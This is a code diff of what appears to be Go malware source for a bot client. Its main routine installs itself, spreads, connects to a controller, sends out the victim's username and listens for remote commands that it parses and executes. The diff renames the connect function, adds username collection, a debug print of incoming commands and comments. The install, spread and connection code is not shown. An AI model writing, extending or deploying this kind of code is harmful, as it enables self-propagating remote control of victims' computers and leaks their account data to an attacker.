@@ -5,6 +5,7 @@
 
 package main
 
+import "os/user"
 import (
 	"fmt"
 	"strings"
@@ -21,7 +22,7 @@ func main() {
 	CheckMultiInstances()
 	Install()
 	Spread()
-	c, _ = ConnectCN()
+	c, _ = Connect()
 	go Send("user", GetUsername())
 	go ListenAndExecute()
 
@@ -50,15 +51,22 @@ func main() {
 	for {
 	}
 }
+func GetUsername() string {
+	usr, _ := user.Current()
+	return usr.Username
+}
 
+// ListenAndExecute recives commands and executes them
 func ListenAndExecute() {
 	for {
 		status := Receive()
+		fmt.Println(status)
 		go ParseProtocol(status)
 	}
 
 }
 
+// ParseProtocol handles recived connections using legacy method
 func ParseProtocol(r string) {
 	commandBuff := strings.Split(r, " ")
 	if len(commandBuff) > 1 {
@@ -75,6 +83,7 @@ func ParseProtocol(r string) {
 	}
 }
 
+// Wait waits 30 seconds
 func Wait() {
 	time.Sleep(30 * time.Second)
 }
